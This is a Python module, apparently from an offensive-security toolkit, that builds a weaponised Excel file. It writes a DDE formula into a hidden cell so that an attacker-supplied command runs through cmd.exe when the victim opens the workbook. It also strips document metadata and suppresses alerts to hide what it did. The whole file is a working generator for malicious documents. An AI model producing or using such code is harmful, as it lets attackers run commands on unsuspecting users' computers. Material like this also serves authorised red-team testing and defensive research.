#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport

import logging
from modules.excel_gen import ExcelGenerator


class ExcelDDE(ExcelGenerator):
    """ 
    Module used to generate MS ecel file with DDE object attack
    """
         
    
    def run(self):
        logging.info(" [+] Generating MS Excel with DDE document...")
        
        # Read command file
        commandFile =self.getCMDFile()    
        if commandFile == "":
            logging.error("   [!] Could not find cmd input!")
            return

        logging.info("   [-] Open document...")
        # open up an instance of Excel with the win32com driver\        \\
        excel = win32com.client.Dispatch("Excel.Application")
        # do the operation in background without actually opening Excel
        excel.Visible = False
        workbook = excel.Workbooks.Open(self.outputFilePath)

        logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
        with open (commandFile, "r") as f:
            command=f.read()
        
        ddeCmd = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!A1""" % command.rstrip()
        excel.Cells(1, 26).Formula = ddeCmd
        excel.Cells(1, 26).FormulaHidden = True
        
        # Remove Informations
        logging.info("   [-] Remove hidden data and personal info...")
        xlRDIAll=99
        workbook.RemoveDocumentInformation(xlRDIAll)
        logging.info("   [-] Save Document...")
        excel.DisplayAlerts=False
        excel.Workbooks(1).Close(SaveChanges=1)
        excel.Application.Quit()
        # garbage collection
        del excel
        logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
         
        
        